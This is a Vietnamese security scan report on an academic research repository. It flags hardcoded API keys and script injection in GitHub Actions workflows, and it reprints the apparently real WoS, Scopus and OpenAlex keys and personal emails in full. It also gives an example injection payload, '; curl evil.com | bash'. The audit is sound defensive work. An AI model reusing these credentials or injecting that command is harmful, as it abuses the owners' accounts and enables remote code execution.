# Báo cáo Quét Bảo mật — vbsec Security Scan Report

| Trường | Giá trị |
|---|---|
| Phạm vi quét (Scope) | `all` (toàn repo) |
| Tổng file tracked | 204 |
| File code được scan | 19 (8 Python + 8 YAML workflow + 3 shell) |
| Ngôn ngữ chính (Primary language) | Python (≈42% code files) + YAML workflows |
| Mode | SMALL (inline scan) |
| Ngày quét | 2026-05-21 |
| Ngôn ngữ báo cáo | vi |
| Skill version | vbsec v0.3+ |

---

## VERDICT: **FAIL** (CRITICAL findings present)

> Phát hiện 3 API keys hardcoded trong GitHub Actions workflows, public-trackable trong git history. Cần thu hồi và rotate ngay lập tức.

---

## CRITICAL (4 findings)

### Overview

| # | File | Line | Rule | Mô tả |
|---|---|---|---|---|
| 1 | `.github/workflows/p6_full_search.yml` | 9 | HARDCODED-SECRET | WoS API key hardcoded làm default input value |
| 2 | `.github/workflows/p6_full_search.yml` | 13 | HARDCODED-SECRET | Scopus API key hardcoded làm default input value |
| 3 | `.github/workflows/p6_full_search.yml` | 17 | HARDCODED-SECRET | OpenAlex API key hardcoded làm default input value |
| 4 | `.github/workflows/scopus_api_search.yml` | 9 | HARDCODED-SECRET | Scopus API key hardcoded (trùng với #2) làm default input value |

### Chi tiết per finding

#### [CRIT-1] HARDCODED-SECRET — WoS Starter API Key

- **File:** `.github/workflows/p6_full_search.yml:9`
- **Rule:** HARDCODED-SECRET
- **Severity:** CRITICAL

**Snippet:**
```yaml
wos_api_key:
  description: 'WoS Starter API Key'
  required: false
  default: '1a0367524ef410f4ef7d0930a349aefe54862ab8'
```

**Tại sao nguy hiểm:**
API key của Clarivate WoS Starter API bị hardcode làm giá trị mặc định cho `workflow_dispatch` input. Vì file `.github/workflows/p6_full_search.yml` là public-trackable trong git history, bất kỳ ai clone repo (kể cả attacker) cũng truy cập được key. Attacker có thể (1) dùng quota API gây cạn tài khoản, (2) gây vi phạm điều khoản dịch vụ Clarivate, (3) bị tính phí nếu plan có usage-based billing.

**Kịch bản tấn công (Attack scenario):**
1. Attacker clone hoặc xem mirror repo GitHub
2. Đọc file `.github/workflows/p6_full_search.yml`
3. Trích xuất API key `1a0367524ef410f4ef7d0930a349aefe54862ab8`
4. Sử dụng key để gọi Clarivate API miễn phí dưới tài khoản nạn nhân
5. Cạn quota hoặc gây vi phạm ToS dẫn đến khóa tài khoản

**Code before:**
```yaml
wos_api_key:
  required: false
  default: '1a0367524ef410f4ef7d0930a349aefe54862ab8'
```

**Code after (an toàn):**
```yaml
wos_api_key:
  description: 'WoS Starter API Key (leave blank to use secret)'
  required: false
  default: ''
# Trong step:
# WOS_API_KEY: ${{ github.event.inputs.wos_api_key || secrets.WOS_API_KEY }}
```

**Khắc phục bắt buộc:**
1. **Rotate (thu hồi + tạo key mới) ngay** trên Clarivate developer portal
2. Lưu key mới vào GitHub repo secrets (Settings → Secrets → Actions → `WOS_API_KEY`)
3. Xóa default value khỏi workflow
4. Reference qua `${{ secrets.WOS_API_KEY }}`
5. Cân nhắc `git filter-repo` để xóa key khỏi git history (key đã bị lộ vẫn cần rotate)

**Đọc thêm:** OWASP A02:2021 — Cryptographic Failures / Hardcoded Credentials (CWE-798)

---

#### [CRIT-2] HARDCODED-SECRET — Scopus API Key

- **File:** `.github/workflows/p6_full_search.yml:13`
- **Rule:** HARDCODED-SECRET
- **Severity:** CRITICAL

**Snippet:**
```yaml
scopus_api_key:
  description: 'Scopus API Key (Elsevier / P6-meta-analysis-CTU)'
  required: false
  default: '5a33a23876e87fa618d635fc89281790'
```

**Tại sao nguy hiểm:**
API key của Elsevier Scopus bị hardcode trong workflow. Scopus là dịch vụ thương mại tính phí; key này nếu lộ có thể bị dùng để (1) khai thác miễn phí quota của institution, (2) gây vi phạm institutional agreement, (3) khóa tài khoản. Đặc biệt nghiêm trọng vì description ghi rõ "P6-meta-analysis-CTU" — gắn liền với danh tính học thuật của tác giả/trường Đại học Cần Thơ.

**Kịch bản tấn công:**
1. Attacker tìm key qua GitHub code search (Scopus key format pattern khá đặc thù)
2. Dùng key thực hiện hàng triệu request Scopus API
3. Tài khoản institution bị Elsevier khóa hoặc tính phí phụ thu
4. Reputational damage cho CTU và tác giả

**Code after:**
```yaml
scopus_api_key:
  description: 'Scopus API Key (leave blank to use repo secret)'
  required: false
  default: ''
# Step env: SCOPUS_API_KEY: ${{ github.event.inputs.scopus_api_key || secrets.SCOPUS_API_KEY }}
```

**Khắc phục:** Rotate trên Elsevier Developer Portal (https://dev.elsevier.com/), move sang `secrets.SCOPUS_API_KEY`.

**Đọc thêm:** CWE-798, OWASP Cheat Sheet — Secrets Management.

---

#### [CRIT-3] HARDCODED-SECRET — OpenAlex API Key

- **File:** `.github/workflows/p6_full_search.yml:17`
- **Rule:** HARDCODED-SECRET
- **Severity:** CRITICAL

**Snippet:**
```yaml
openalex_api_key:
  description: 'OpenAlex API Key'
  required: false
  default: 'WV8Ajx6C6qBvJirOOOEpYY'
```

**Tại sao nguy hiểm:**
OpenAlex "premium" / "polite pool" key bị hardcode. Mặc dù OpenAlex là free service, key cấp quyền truy cập tier cao hơn (rate limit lớn hơn). Attacker có thể abuse rate limit, dẫn đến (1) IP/account bị throttle xuống tier mặc định, (2) ảnh hưởng workflow scientific research của nhóm.

**Code after:** Tương tự — chuyển sang `secrets.OPENALEX_API_KEY`.

**Khắc phục:** Request key mới từ OpenAlex team, đưa vào GitHub secrets.

---

#### [CRIT-4] HARDCODED-SECRET — Scopus API Key (duplicate)

- **File:** `.github/workflows/scopus_api_search.yml:9`
- **Rule:** HARDCODED-SECRET
- **Severity:** CRITICAL

Cùng giá trị key Scopus như CRIT-2. Xác nhận key đã bị lộ ở 2 nơi → việc rotate bắt buộc. Sau khi rotate, sử dụng pattern `${{ github.event.inputs.scopus_api_key || secrets.SCOPUS_API_KEY }}` đã có sẵn ở line 39 nhưng giá trị default phải về `''`.

---

## HIGH (2 findings)

### Overview

| # | File | Line | Rule | Mô tả |
|---|---|---|---|---|
| 1 | `.github/workflows/p6_full_search.yml` | 59, 64, 78, 92, 106 | COMMAND-INJECTION | Workflow inputs nội suy trực tiếp vào `run:` shell |
| 2 | `.github/workflows/unpaywall_query.yml`, `pdf_download_extract.yml`, `abstract_fetch.yml`, `doi_enrichment.yml` | Nhiều dòng | COMMAND-INJECTION | `${{ github.event.inputs.* }}` nội suy thẳng vào shell |

### Chi tiết

#### [HIGH-1] COMMAND-INJECTION — GitHub Actions script injection

- **File:** `.github/workflows/p6_full_search.yml` (lines 59, 64, 78, 84, 92, 98, 106, 107)
- **Rule:** COMMAND-INJECTION
- **Severity:** HIGH

**Mô tả:** `${{ github.event.inputs.<X> }}` được nội suy trực tiếp vào `run:` block của bash. Khi GitHub Actions render workflow, giá trị input được substitute LITERALLY vào script trước khi shell parse. Nếu attacker có quyền trigger workflow (write access) và đặt input chứa `; curl evil.com | bash`, lệnh sẽ chạy trong runner context.

**Tác động:** Vì workflow chỉ trigger qua `workflow_dispatch` (manual), tác động giới hạn ở user có write access. Tuy nhiên vẫn là vi phạm best practice CodeQL `js/actions/command-injection`. Trong runner có `GITHUB_TOKEN` với `contents: write` → attacker có thể push commit, exfiltrate secrets.

**Code before (vulnerable):**
```yaml
- name: Run WoS Starter API search
  run: |
    python3 p6/tools/06_wos_api_search.py \
      --max ${{ github.event.inputs.max_wos }} \   # ← injected directly
      --output ...
```

**Code after (an toàn):**
```yaml
- name: Run WoS Starter API search
  env:
    MAX_WOS: ${{ github.event.inputs.max_wos }}   # ← qua env var
  run: |
    python3 p6/tools/06_wos_api_search.py \
      --max "$MAX_WOS" \
      --output ...
```

**Đọc thêm:** https://securitylab.github.com/research/github-actions-untrusted-input/, CWE-78, GitHub Docs "Security hardening for GitHub Actions".

---

#### [HIGH-2] COMMAND-INJECTION — Multiple workflows with direct input interpolation

- **File:** `.github/workflows/unpaywall_query.yml:48-51, 55, 70, 72`
- **File:** `.github/workflows/pdf_download_extract.yml:46, 48`
- **File:** `.github/workflows/abstract_fetch.yml:60, 72`
- **File:** `.github/workflows/scopus_api_search.yml:42`
- **Rule:** COMMAND-INJECTION
- **Severity:** HIGH

**Mô tả:** Cùng pattern như HIGH-1 nhưng ở nhiều file workflow khác. Inputs như `queue_file`, `output_file`, `input_file` được nội suy trực tiếp vào `git add`, `python3 ... --output` mà không qua env var và không quote-escape.

**Fix tổng quát:** Move tất cả `${{ github.event.inputs.* }}` vào `env:` block của step, sau đó tham chiếu qua `"$VAR"` trong bash.

**Đọc thêm:** GitHub Security Lab — Keeping your GitHub Actions and workflows secure.

---

## MEDIUM (3 findings)

| # | File | Line | Rule | Mô tả |
|---|---|---|---|---|
| 1 | `replication/p3_singapore_replication.py` | 13 | VERBOSE-ERROR-DEBUG-MODE | Hardcoded absolute path `/root/.claude/uploads/...` — không portable, lộ cấu trúc filesystem agent |
| 2 | `replication/p4_vietnam_replication.py` | 13 | VERBOSE-ERROR-DEBUG-MODE | Cùng pattern hardcoded path |
| 3 | `replication/p5_china_replication.py` | 17 | VERBOSE-ERROR-DEBUG-MODE | Cùng pattern hardcoded path |

**Khắc phục:** Đọc đường dẫn từ env var `WBES_DATA_DIR`, fallback sang argparse. Ví dụ:
```python
import os, argparse
UPLOAD = os.environ.get("WBES_DATA_DIR") or sys.argv[1] if len(sys.argv) > 1 else "./data"
```

---

## LOW (4 findings)

| # | File | Line | Rule | Mô tả |
|---|---|---|---|---|
| 1 | `.github/workflows/p6_full_search.yml` | 132 | HARDCODED-SECRET | Email PII `Thuyhuongctu@gmail.com` (User-Agent header) |
| 2 | `.github/workflows/doi_enrichment.yml` | 50 | HARDCODED-SECRET | Email PII `huongp1323001@gstudent.ctu.edu.vn` |
| 3 | `scripts/submission-checklist.py` | 115-122 | HARDCODED-SECRET | Tên đầy đủ tác giả + username email trong `BLIND_PATTERNS` (intentional cho blind-review check, nhưng vẫn là PII committed git) |
| 4 | `replication/p4_vietnam_replication.py` | 27; `p5_china_replication.py` | 33 | VERBOSE-ERROR-DEBUG-MODE | Bare `except:` clause nuốt mọi exception (sai practice clean-code) |

**Ghi chú:** Các email tác giả thực ra là intentional — cần thiết cho (a) User-Agent của OpenAlex polite pool, (b) Crossref/Unpaywall API yêu cầu email contact, (c) blind-review detection. Đây là LOW chứ không HIGH vì không có credential nào leak qua các email này, chỉ là privacy concern.

---

## INFO (1 finding)

| # | File | Line | Rule | Mô tả |
|---|---|---|---|---|
| 1 | `.gitignore` | - | OUTDATED-DEPENDENCY | Không có `vbsec-reports/` trong .gitignore (skill recommendation v0.3+); cũng không exclude `dist/security_scan_*` |

---

## PASSED CHECKS (rule applicable đã check, không phát hiện vấn đề)

- **SQL-INJECTION** — Không có DB query trong codebase (academic repo, chỉ statsmodels OLS); pandas DataFrame ops L3-only.
- **XSS** — Không có HTML rendering / web frontend.
- **IDOR** — Không có HTTP route / authorization layer.
- **SLOPSQUATTING** — Imports đều là package phổ biến: `pyreadstat`, `pandas`, `numpy`, `matplotlib`, `statsmodels`, `docx` (python-docx), `pdfplumber`, `requests`. Không có lookalike/typosquat.
- **BRUTE-FORCE** — Không có endpoint authentication.
- **MASS-ASSIGNMENT** — Không có ORM/form binding.
- **INSECURE-DESERIALIZATION** — Không phát hiện `pickle.load`, `yaml.load` (chỉ `pyreadstat.read_dta` trên file local L4); không có `eval`, `exec`.
- **SSRF** — `requests.get` trong workflow chỉ gọi static URL list (`api.openalex.org`, `api.elsevier.com`, `api.clarivate.com`) — L3 constants, không lấy URL từ user input.
- **PATH-TRAVERSAL** — File paths đều build từ `Path(__file__).parent` hoặc `os.path.join(REPO, ...)` (L3/L4). Argparse `--manuscript` nhận Path nhưng chỉ `read_text()` không có write/delete dynamic.
- **CSRF** — Không có web app.
- **BROKEN-ACCESS-CONTROL** — N/A.
- **WEAK-PASSWORD-HASHING** — Không có user auth.
- **JWT-NONE-ALGORITHM** — Không dùng JWT.
- **CORS-MISCONFIG** — Không có HTTP server.
- **UNRESTRICTED-FILE-UPLOAD** — Không có upload endpoint (pdf_download_extract chỉ tải PDF từ URL whitelist trong `extraction_queue` CSV của repo).
- **MISSING-RATE-LIMIT** — Repo academic, không có API server. Workflow có timeout 90 min (OK).
- **RACE-CONDITION** — Single-process scripts, không multi-threaded.

---

## Next Steps (ưu tiên cao → thấp)

1. **NGAY LẬP TỨC** — Rotate 3 API keys: WoS (Clarivate), Scopus (Elsevier), OpenAlex. Move sang GitHub Secrets.
2. **Trong 24h** — Đổi tất cả `${{ github.event.inputs.X }}` trong `run:` thành `env:` pattern (HIGH-1, HIGH-2). 9 file workflow cần sửa.
3. **Trong 1 tuần** — Cân nhắc `git filter-repo` để xóa key khỏi commit history (dù đã rotate). History của file workflow có chứa key.
4. **Khuyến nghị** — Replace hardcoded `/root/.claude/uploads/...` paths bằng env var để replication scripts chạy được trên máy khác.
5. **Khuyến nghị** — Sửa bare `except:` thành `except Exception as e:` để không nuốt KeyboardInterrupt / SystemExit.

---

📄 Báo cáo đã lưu: `dist/security_scan_report.md`
📊 JSON summary: `dist/security_scan_summary.json`

⚠️ Lưu ý gitignore: `dist/security_scan_*` không nằm trong `.gitignore`. Cân nhắc thêm dòng `dist/security_scan_*` để tránh commit báo cáo bảo mật vào git.

---

## Footer + Disclaimer

Báo cáo được tạo bởi `vbsec` security scanner (skill `vbs-scan-security`). Đây là kết quả static analysis dựa trên 21 rule chung + Python overlay; không thay thế penetration testing hoặc human security audit. Một số finding có thể là false positive tùy ngữ cảnh business.

---

## JSON Summary (canonical English, machine-readable)

```json
{
  "scope": "all",
  "total_files_tracked": 204,
  "total_files_scanned": 19,
  "primary_language": "python+yaml",
  "mode": "small",
  "scan_date": "2026-05-21",
  "verdict": "FAIL",
  "summary": {
    "critical": 4,
    "high": 2,
    "medium": 3,
    "low": 4,
    "info": 1,
    "total": 14
  },
  "findings": [
    {
      "id": "CRIT-1",
      "rule_id": "HARDCODED-SECRET",
      "severity": "CRITICAL",
      "file": ".github/workflows/p6_full_search.yml",
      "line": 9,
      "issue": "WoS Starter API key hardcoded as workflow_dispatch default input value",
      "fix": "Rotate key on Clarivate portal, store in GitHub Secrets (WOS_API_KEY), reference via secrets context"
    },
    {
      "id": "CRIT-2",
      "rule_id": "HARDCODED-SECRET",
      "severity": "CRITICAL",
      "file": ".github/workflows/p6_full_search.yml",
      "line": 13,
      "issue": "Scopus API key hardcoded as workflow_dispatch default input value",
      "fix": "Rotate key on Elsevier Developer Portal, store in secrets.SCOPUS_API_KEY"
    },
    {
      "id": "CRIT-3",
      "rule_id": "HARDCODED-SECRET",
      "severity": "CRITICAL",
      "file": ".github/workflows/p6_full_search.yml",
      "line": 17,
      "issue": "OpenAlex API key hardcoded as workflow_dispatch default input value",
      "fix": "Request new key, store in secrets.OPENALEX_API_KEY"
    },
    {
      "id": "CRIT-4",
      "rule_id": "HARDCODED-SECRET",
      "severity": "CRITICAL",
      "file": ".github/workflows/scopus_api_search.yml",
      "line": 9,
      "issue": "Scopus API key duplicated hardcoded (same value as CRIT-2)",
      "fix": "Remove default value, rely on existing fallback ${{ github.event.inputs.scopus_api_key || secrets.SCOPUS_API_KEY }}"
    },
    {
      "id": "HIGH-1",
      "rule_id": "COMMAND-INJECTION",
      "severity": "HIGH",
      "file": ".github/workflows/p6_full_search.yml",
      "line": "59,64,78,84,92,98,106,107",
      "issue": "GitHub Actions input interpolated directly into run: bash via ${{ github.event.inputs.* }}",
      "fix": "Move inputs into env: block, reference via $VAR in bash to prevent script injection"
    },
    {
      "id": "HIGH-2",
      "rule_id": "COMMAND-INJECTION",
      "severity": "HIGH",
      "file": ".github/workflows/unpaywall_query.yml,pdf_download_extract.yml,abstract_fetch.yml,doi_enrichment.yml,scopus_api_search.yml",
      "line": "multiple",
      "issue": "Same input-into-run script injection pattern across multiple workflows",
      "fix": "Apply same env-var wrapping pattern to all workflows"
    },
    {
      "id": "MED-1",
      "rule_id": "VERBOSE-ERROR-DEBUG-MODE",
      "severity": "MEDIUM",
      "file": "replication/p3_singapore_replication.py",
      "line": 13,
      "issue": "Hardcoded absolute path /root/.claude/uploads/<uuid> exposes agent filesystem layout and breaks portability",
      "fix": "Read from env var WBES_DATA_DIR or argparse"
    },
    {
      "id": "MED-2",
      "rule_id": "VERBOSE-ERROR-DEBUG-MODE",
      "severity": "MEDIUM",
      "file": "replication/p4_vietnam_replication.py",
      "line": 13,
      "issue": "Hardcoded absolute path /root/.claude/uploads/<uuid>",
      "fix": "Read from env var"
    },
    {
      "id": "MED-3",
      "rule_id": "VERBOSE-ERROR-DEBUG-MODE",
      "severity": "MEDIUM",
      "file": "replication/p5_china_replication.py",
      "line": 17,
      "issue": "Hardcoded absolute path /root/.claude/uploads/<uuid>",
      "fix": "Read from env var"
    },
    {
      "id": "LOW-1",
      "rule_id": "HARDCODED-SECRET",
      "severity": "LOW",
      "file": ".github/workflows/p6_full_search.yml",
      "line": 132,
      "issue": "Author personal email Thuyhuongctu@gmail.com hardcoded in User-Agent header (PII, not a credential)",
      "fix": "Move email to env var or repo secret (acceptable for OpenAlex polite-pool convention but still PII)"
    },
    {
      "id": "LOW-2",
      "rule_id": "HARDCODED-SECRET",
      "severity": "LOW",
      "file": ".github/workflows/doi_enrichment.yml",
      "line": 50,
      "issue": "Institutional email huongp1323001@gstudent.ctu.edu.vn hardcoded as CLI arg",
      "fix": "Move to repo secret CONTACT_EMAIL"
    },
    {
      "id": "LOW-3",
      "rule_id": "HARDCODED-SECRET",
      "severity": "LOW",
      "file": "scripts/submission-checklist.py",
      "line": "115-122",
      "issue": "Author full name + email username in BLIND_PATTERNS list (intentional for blind-review detection but still PII in git)",
      "fix": "Acceptable as designed; document that this list is publicly visible"
    },
    {
      "id": "LOW-4",
      "rule_id": "VERBOSE-ERROR-DEBUG-MODE",
      "severity": "LOW",
      "file": "replication/p4_vietnam_replication.py,replication/p5_china_replication.py",
      "line": "27,33",
      "issue": "Bare except: clause swallows all exceptions including KeyboardInterrupt/SystemExit",
      "fix": "Use except Exception as e: and log e"
    },
    {
      "id": "INFO-1",
      "rule_id": "OUTDATED-DEPENDENCY",
      "severity": "INFO",
      "file": ".gitignore",
      "line": 0,
      "issue": "vbsec-reports/ and dist/security_scan_* not in .gitignore",
      "fix": "Add lines: vbsec-reports/ and dist/security_scan_*"
    }
  ],
  "passed_rules": [
    "SQL-INJECTION", "XSS", "IDOR", "SLOPSQUATTING", "BRUTE-FORCE",
    "MASS-ASSIGNMENT", "INSECURE-DESERIALIZATION", "SSRF", "PATH-TRAVERSAL",
    "CSRF", "BROKEN-ACCESS-CONTROL", "WEAK-PASSWORD-HASHING",
    "JWT-NONE-ALGORITHM", "CORS-MISCONFIG", "UNRESTRICTED-FILE-UPLOAD",
    "MISSING-RATE-LIMIT", "RACE-CONDITION"
  ],
  "top_rules_by_count": {
    "HARDCODED-SECRET": 7,
    "COMMAND-INJECTION": 2,
    "VERBOSE-ERROR-DEBUG-MODE": 4,
    "OUTDATED-DEPENDENCY": 1
  }
}
```
